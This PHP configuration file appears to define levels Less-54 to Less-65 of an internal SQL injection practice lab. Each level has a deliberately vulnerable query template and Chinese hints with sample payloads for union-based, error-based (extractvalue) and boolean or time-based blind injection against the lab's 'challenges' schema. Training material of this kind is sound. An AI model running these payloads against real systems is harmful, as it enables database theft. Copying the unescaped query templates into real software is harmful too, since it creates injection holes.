<?php
// 挑战关系列配置（Less-54~65，内部演练接口）
$t = 'challenges';
return [
[
  'id' => 'Less-54', 'series' => true, 'd' => 4, 'err' => false,
  'sql' => "SELECT id, title, content FROM oa_notice WHERE id='{id}' LIMIT 0,1",
  'h' => [
    '先用单引号探测闭合，再 union 查询。回显正常、报错不显示——联合查询是首选。',
    '先 order by 确认列数（3 列），再从 information_schema 找 challenges 库的随机表名，查列名，最后取 secret 值。',
    "示例：?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'-- -",
  ],
],
[
  'id' => 'Less-55', 'series' => true, 'd' => 4, 'err' => false,
  'sql' => 'SELECT id, title, content FROM oa_notice WHERE id=({id}) LIMIT 0,1',
  'h' => [
    '本关整型且带一层括号闭合，无报错回显。',
    'payload 先补右括号再注释，联合查询走 information_schema 流程。',
    "示例：?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'-- -",
  ],
],
[
  'id' => 'Less-56', 'series' => true, 'd' => 4, 'err' => false,
  'sql' => "SELECT id, title, content FROM oa_notice WHERE id=('{id}') LIMIT 0,1",
  'h' => [
    '单引号 + 括号闭合，无报错回显。',
    'payload 形如 -1\') ... 补齐 ) 后注释。',
    "示例：?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'-- -",
  ],
],
[
  'id' => 'Less-57', 'series' => true, 'd' => 4, 'err' => false,
  'sql' => 'SELECT id, title, content FROM oa_notice WHERE id="{id}" LIMIT 0,1',
  'h' => [
    '单引号试不出效果时换双引号。',
    '双引号闭合 + 联合查询。',
    "示例：?id=-1\" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'-- -",
  ],
],
[
  'id' => 'Less-58', 'series' => true, 'd' => 4, 'err' => true,
  'sql' => "SELECT id, title, content FROM oa_notice WHERE id='{id}' LIMIT 0,1",
  'h' => [
    '有报错回显——报错注入比盲注省次数，10 次限制下优先用报错。',
    '单引号闭合 + extractvalue/updatexml。',
    "示例：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))-- -",
  ],
],
[
  'id' => 'Less-59', 'series' => true, 'd' => 4, 'err' => true,
  'sql' => 'SELECT id, title, content FROM oa_notice WHERE id={id} LIMIT 0,1',
  'h' => [
    '整型闭合 + 报错回显。',
    '无需闭合引号，报错函数直接拼。',
    "示例：?id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))-- -",
  ],
],
[
  'id' => 'Less-60', 'series' => true, 'd' => 4, 'err' => true,
  'sql' => 'SELECT id, title, content FROM oa_notice WHERE id=("{id}") LIMIT 0,1',
  'h' => [
    '报错回显可用，闭合方式先探测——双引号加括号。',
    'payload 先补 ") 再接报错函数。',
    '示例：?id=1") and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\'challenges\'),0x7e))-- -',
  ],
],
[
  'id' => 'Less-61', 'series' => true, 'd' => 5, 'err' => true,
  'sql' => "SELECT id, title, content FROM oa_notice WHERE id=(('{id}')) LIMIT 0,1",
  'h' => [
    '报错回显可用；闭合需要两层括号。',
    'payload 补 )) 后接报错函数。',
    "示例：?id=1')) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))-- -",
  ],
],
[
  'id' => 'Less-62', 'series' => true, 'd' => 5, 'err' => false,
  'sql' => "SELECT id, title, content FROM oa_notice WHERE id=('{id}') LIMIT 0,1",
  'h' => [
    '无报错、无数据回显——时间盲注，10 次限制很紧。',
    '闭合为单引号+括号，用 if+sleep 验证后一次查询带出多信息。',
    "示例：?id=1') and if((select length((select table_name from information_schema.tables where table_schema='challenges' limit 0,1)))=10,sleep(3),0)-- -",
  ],
],
[
  'id' => 'Less-63', 'series' => true, 'd' => 5, 'err' => false,
  'sql' => "SELECT id, title, content FROM oa_notice WHERE id='{id}' LIMIT 0,1",
  'h' => [
    '布尔差异可用（有/无结果），无报错回显。',
    '单引号闭合，and 条件控制返回行。',
    "示例：?id=1' and (select length((select table_name from information_schema.tables where table_schema='challenges' limit 0,1)))=10-- -",
  ],
],
[
  'id' => 'Less-64', 'series' => true, 'd' => 5, 'err' => false,
  'sql' => 'SELECT id, title, content FROM oa_notice WHERE id=(({id})) LIMIT 0,1',
  'h' => [
    '整型 + 双层括号 + 盲注。',
    'payload 补 )) 后接子查询条件。',
    "示例：?id=1)) and (select length((select table_name from information_schema.tables where table_schema='challenges' limit 0,1)))=10-- -",
  ],
],
[
  'id' => 'Less-65', 'series' => true, 'd' => 5, 'err' => false,
  'sql' => 'SELECT id, title, content FROM oa_notice WHERE id=({id}) LIMIT 0,1',
  'h' => [
    '整型 + 单层括号 + 时间盲注。',
    '补 ) 后构造 if+sleep，一次请求验证一个判断。',
    "示例：?id=1) and if((select length((select table_name from information_schema.tables where table_schema='challenges' limit 0,1)))=10,sleep(3),0)-- -",
  ],
],
];
